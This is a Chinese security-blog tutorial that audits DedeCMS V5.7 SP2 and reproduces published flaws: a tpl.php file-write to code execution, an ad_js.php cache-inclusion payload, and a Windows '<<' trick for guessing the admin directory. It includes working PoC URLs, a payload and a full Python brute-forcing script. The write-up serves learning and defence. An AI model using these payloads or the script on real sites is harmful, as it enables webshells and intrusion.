@@ -1,0 +1,450 @@
+# 代码审计入门级DedecmsV5.7 SP2分析复现
+
+阅读量 **246116**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-08-26 14:00:56
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p3.ssl.qhimg.com/t015e285d5ff199847c.jpg)
+
+author: Hpdoger
+
+## 索引
+
+Dedecms的洞有很多，而最新版的v5.7 sp2更新也止步于1月。作为一个审计小白,看过《代码审计-企业级Web代码安全构架》后懵懵懂懂，一次偶然网上冲浪看到mochazz师傅在blog发的审计项目,十分有感触。跟着复现了两个dedecms代码执行的cve,以一个新手的视角重新审视这些代码，希望文章可以帮助像我这样入门审计不久的表哥们。文章若有片面或不足的地方还请师傅们多多斧正。
+
+## 环境
+
+php5.45 + mysql  
+审计对象：DedeCMS V5.7 SP2  
+工具：seay源码审计
+
+## 后台代码执行
+
+###  漏洞描述
+
+DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell
+
+###  代码审计
+
+漏洞位置：dede/tpl.php
+
+看一下核心代码：
+
+    
+    
+    # /dede/tpl.php
+    <?php
+    require_once(dirname(__FILE__)."/config.php");
+    CheckPurview('plus_文件管理器');
+    
+    $action = isset($action) ? trim($action) : '';
+    ......
+    if(empty($filename))    $filename = '';
+    $filename = preg_replace("#[/\\]#", '', $filename);
+    ......
+    else if($action=='savetagfile')
+    {
+        csrf_check();
+        if(!preg_match("#^[a-z0-9_-]{1,}.lib.php$#i", $filename))
+        {
+            ShowMsg('文件名不合法，不允许进行操作！', '-1');
+            exit();
+        }
+        require_once(DEDEINC.'/oxwindow.class.php');
+        $tagname = preg_replace("#.lib.php$#i", "", $filename);
+        $content = stripslashes($content);
+        $truefile = DEDEINC.'/taglib/'.$filename;
+        $fp = fopen($truefile, 'w');
+        fwrite($fp, $content);
+        fclose($fp);
+        ......
+    }
+    
+
+因为dedecms全局变量注册(register_globals=on)，这里有两个可控变量$filename&$content
+
+action=savetag时，进行csrf()检测
+
+    
+    
+    function csrf_check()
+    {
+        global $token;
+    
+        if(!isset($token) || strcasecmp($token, $_SESSION['token']) != 0){
+            echo '<a href="http://bbs.dedecms.com/907721.html">DedeCMS:CSRF Token Check Failed!</a>';
+            exit;
+        }
+    }
+    
+
+验证token和已知的session是否相等，那么token的值从何获取呢？
+
+回溯tpl.php，追踪一下token：
+
+    
+    
+    else if ($action == 'upload')
+    {
+            ....
+            <input name='acdir' type='hidden' value='$acdir'  />
+            <input name='token' type='hidden' value='{$_SESSION['token']}'  />
+            <input name='upfile' type='file' id='upfile' style='width:380px' />
+    }
+    
+
+当action=upload时，隐藏表单的value提交token值  
+
+token搞定了，再让我们继续往下审~
+
+    
+    
+    $truefile = DEDEINC.'/taglib/'.$filename;
+    
+
+传入的filename必须为 xxxx.lib.php，并且保存的也是php文件
+
+    
+    
+        fwrite($fp, $content);
+        fclose($fp);
+    
+
+写入内容为$content…那岂不是为所欲为..  
+poc:
+
+    
+    
+    http://localhost/dedecms/uploads/dede/tpl.php?action=savetagfile&filename=hpdoger.lib.php&content=<?php phpinfo();?>&token=55f2eb0ad241e1893276ed1f8e7dd5fa
+    
+
+在include/taglib下会产生相应xxx.lib.php
+
+## 后台代码执行Getshell
+
+###  代码审计
+
+问题代码位于：/uploads/plus/ad_js.php
+
+    
+    
+     */
+    require_once(dirname(__FILE__)."/../include/common.inc.php");
+    
+    if(isset($arcID)) $aid = $arcID;
+    $arcID = $aid = (isset($aid) && is_numeric($aid)) ? $aid : 0;
+    if($aid==0) die(' Request Error! ');
+    
+    $cacheFile = DEDEDATA.'/cache/myad-'.$aid.'.htm';
+    if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) > $cfg_puccache_time )
+    {
+        $row = $dsql->GetOne("SELECT * FROM `#@__myad` WHERE aid='$aid' ");
+        $adbody = '';
+        if($row['timeset']==0)
+        {
+            $adbody = $row['normbody'];
+        }
+        else
+        {
+            $ntime = time();
+            if($ntime > $row['endtime'] || $ntime < $row['starttime']) {
+                $adbody = $row['expbody'];
+            } else {
+                $adbody = $row['normbody'];
+            }
+        }
+        $adbody = str_replace('"', '"',$adbody);
+        $adbody = str_replace("r", "\r",$adbody);
+        $adbody = str_replace("n", "\n",$adbody);
+        $adbody = "<!--rndocument.write("{$adbody}");rn-->rn";
+        $fp = fopen($cacheFile, 'w');
+        fwrite($fp, $adbody);
+        fclose($fp); 
+    }
+    include $cacheFile;
+    
+
+摘出关键语句：
+
+    
+    
+    if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) > $cfg_puccache_time )
+    
+
+要求$nocache存在，又可以利用前面的全局变量注册
+
+往下走Getone()函数进行sql查询，返回一个结果集。
+
+而后把取到的值和当前的时间点对比作为判断条件，决定取表中的normbody还是exbody赋值给$adbody。
+
+接着就比较明朗了..将$adbody写入文件，而文件名我们抓包应该就可以知道。
+
+但是这里我只看了这一个文件，现在整理一下思路：  
+1、给出一个$aid进行sql查询  
+2、根据查询值判断写文件，且文件内容可控，目录已知  
+3、最后把写入的文件包含进来。
+
+那么，我们这个$aid从何处传入数据库呢？随着这个思路追踪文件到：/dede/ad_add.php
+
+一个编辑页面，抓包看一下键值对应，顺便瞅一眼mysql载入的数据  
+看到这里知道，清楚exbody和normbody对应的都是什么了
+
+依据代码`$row = $dsql->GetOne("SELECT * FROM `#[@__myad](https://github.com/__myad
+"@__myad")` WHERE aid='$aid' ");`查看dede__myad这个库插入的内容：  
+
+看到timeset=0，回溯代码，那么直接是取`$adbody = $row['normbody'];`这段执行。  
+其实timeset何时都为0，浏览ad_add.php代码部分看到，存入数据库的timeset值就为0，语句如下，$timeset定义为0
+
+    
+    
+     $query = "
+         INSERT INTO #@__myad(clsid,typeid,tagname,adname,timeset,starttime,endtime,normbody,expbody)
+         VALUES('$clsid','$typeid','$tagname','$adname','$timeset','$starttime','$endtime','$normbody','$expbody');
+    
+
+ok 要读懂流程,才能开始复现
+
+###  复现
+
+我们之前已经保存过一个页面了，直接poke一下`http://localhost/dedecms/uploads/plus/ad_js.php?aid=1`看看  
+
+查看写入文件：`http://localhost/dedecms/uploads/data/cache/myad-1.htm`注意拼接变量名  
+
+htm文件成功写入，我们回到Ad_js来执行一下任意代码。不要忘记闭合前面的document文档注释语句  
+payload:
+
+    
+    
+    hpdoger=echo '-->'; phpinfo();
+    
+
+![](https://s1.ax1x.com/2018/08/22/PTGwQI.jpg)
+
+## winapi查找后台目录
+
+###  利用条件
+
+1、win系统下搭建的网站  
+2、网站后台目录存在/images/adminico.gif
+
+###  基础知识
+
+windows环境下查找文件基于Windows FindFirstFile的winapi函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。
+
+利用方法很简单，我们只要将文件名不可知部分之后的字符用“<”或者“>”代替即可，不过要注意的一点是，只使用一个“<”或者“>”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1<”或者“1>”都是访问不到文件的，需要“1<<”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。
+
+###  审计
+
+核心文件：common.inc.php
+
+    
+    
+    if($_FILES)
+    {
+        require_once(DEDEINC.'/uploadsafe.inc.php');
+    }
+    
+
+追踪uploadsafe.inc.php
+
+    
+    
+    if( preg_match('#^(cfg_|GLOBALS)#', $_key) )
+    {
+        exit('Request var not allow for uploadsafe!');
+    }
+    $$_key = $_FILES[$_key]['tmp_name']; //获取temp_name 
+    ${$_key.'_name'} = $_FILES[$_key]['name'];
+    ${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z./]#i', '', $_FILES[$_key]['type']);
+    ${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']);
+    if(!empty(${$_key.'_name'}) && (preg_match("#.(".$cfg_not_allowall.")$#i",${$_key.'_name'}) || !preg_match("#.#", ${$_key.'_name'})) )
+    {
+        if(!defined('DEDEADMIN'))
+        {
+            exit('Not Admin Upload filetype not allow !');
+        }
+    }
+    if(empty(${$_key.'_size'}))
+    {
+        ${$_key.'_size'} = @filesize($$_key);
+    }
+    $imtypes = array
+    (
+        "image/pjpeg", "image/jpeg", "image/gif", "image/png", 
+        "image/xpng", "image/wbmp", "image/bmp"
+    );
+    if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes))
+    {
+        $image_dd = @getimagesize($$_key); 
+        //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。
+        if (!is_array($image_dd))
+        {
+            exit('Upload filetype not allow !');
+        }
+    }
+    
+
+摘出这句：
+
+    
+    
+     $image_dd = @getimagesize($$_key);
+    
+
+进行判断$$_key是否为图片或图片是否存在
+
+然而$$_key的来源是$_FILES[$_key][‘tmp_name’]，上文说了全局变量注册，$FILE可控，那我们传入一个$_FILES[$_key][‘tmp_name’]亦可控，此处是产生了一个变量覆盖的
+
+接着再看同文件的代码
+
+    
+    
+        ${$_key.'_name'} = $_FILES[$_key]['name'];
+        ${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z./]#i', '', $_FILES[$_key]['type']);
+        ${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']);
+    
+        if(!empty(${$_key.'_name'}) && (preg_match("#.(".$cfg_not_allowall.")$#i",${$_key.'_name'}) || !preg_match("#.#", ${$_key.'_name'})) )
+        {
+            if(!defined('DEDEADMIN'))
+            {
+                exit('Not Admin Upload filetype not allow !');
+            }
+        }
+    
+
+其中,$cfg_not_allowall的范围如下：
+
+    
+    
+    $cfg_not_allowall = "php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml";
+    
+
+既然上传的name不让以这些结尾，那么我们查.gif不过分吧
+
+找一处验证以下这个核心文件产生的小漏洞：  
+  
+
+###  POC
+
+    
+    
+    _FILES[hpdoger][tmp_name]=./ded<</images/adminico.gif&_FILES[hpdoger][name]=0&_FILES[hpdoger][size]=0&_FILES[hpdoger][type]=image/gif
+    
+
+这个poc根据mochazz师傅的poc练手写的，膜mochazz师傅~：
+
+    
+    
+    # -*- coding: utf-8 -*-    from itertools import permutations
+    import requests
+    
+    def guess_back_dir(url,data,characters):
+        for num in range(1,5):
+            for every in permutations(characters,num):
+                payload = ''.join(every)
+                data["_FILES[hpdoger][tmp_name]"] = data["_FILES[hpdoger][tmp_name]"].format(p = payload)
+                print("testing:",payload)
+                r = requests.post(url,data = data)
+                if find_page(r) > 0:
+                    print("back_dir:[+]",payload)
+                    data["_FILES[hpdoger][tmp_name]"] = "./{p}<</images/adminico.gif"
+                    return payload
+                data["_FILES[hpdoger][tmp_name]"] = "./{p}<</images/adminico.gif"
+    
+    def guess_rest_dir(back_dir,url,data,characters):
+        while True:
+            for singel in characters:
+                if singel != characters[-1]:
+                    data["_FILES[hpdoger][tmp_name]"] = data["_FILES[hpdoger][tmp_name]"].format(p=back_dir + singel)
+                    r = requests.post(url,data = data)
+                    # print data
+                    if find_page(r) > 0:
+                        print("guess successfully[+]:",back_dir)
+                        back_dir += singel
+                        data["_FILES[hpdoger][tmp_name]"] = "./{p}<</images/adminico.gif"
+                        break
+                    data["_FILES[hpdoger][tmp_name]"] = "./{p}<</images/adminico.gif"
+                else:
+                    return  back_dir
+    
+    def find_page(response):
+        if "Upload filetype not allow !" not in response.text and response.status_code == 200:
+            return 1
+    
+    def main():
+        characters = "abcdefghijklmnopqrstuvwxyz0123456789_!#"
+        url = raw_input("Please input your target:")
+        data = {
+            "_FILES[hpdoger][tmp_name]": "./{p}<</images/adminico.gif",
+            "_FILES[hpdoger][name]": 0,
+            "_FILES[hpdoger][size]": 0,
+            "_FILES[hpdoger][type]": "image/gif"
+        }
+    
+        back_dir = guess_back_dir(url,data,characters)
+        name = guess_rest_dir(back_dir,url,data,characters)
+        print("The background address is[+]:",name)
+    
+    
+    if __name__ == '__main__':
+        main()
+    
+
+###  最后穿插一个关于FILE变量的小知识点
+
+$_FILES[“file”][“name”] – 被上传文件的名称  
+$_FILES[“file”][“type”] – 被上传文件的类型  
+$_FILES[“file”][“size”] – 被上传文件的大小，以字节计  
+$_FILES[“file”][“tmp_name”] – 存储在服务器的文件的临时副本的名称  
+$_FILES[“file”][“error”] – 由文件上传导致的错误代码
+
+## 相关链接
+
+代码审计之DedeCMS V5.7
+SP2后台存在代码执行漏洞(<https://mochazz.github.io/2018/03/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%20V5.7%20SP2%E5%90%8E%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/>)
+
+奇技淫巧 |
+DEDECMS找后台目录(<https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/>)
+
+膜前辈师傅们~
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **Hpdoger** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/157522](/post/id/157522)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [代码审计](/tag/代码审计)
+  * [cve复现](/tag/cve复现)
+
+ **+1** __3赞
+
+ __收藏
+
+![](https://p5.ssl.qhimg.com/t01b9b27da71ece1d6b.png) Hpdoger
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
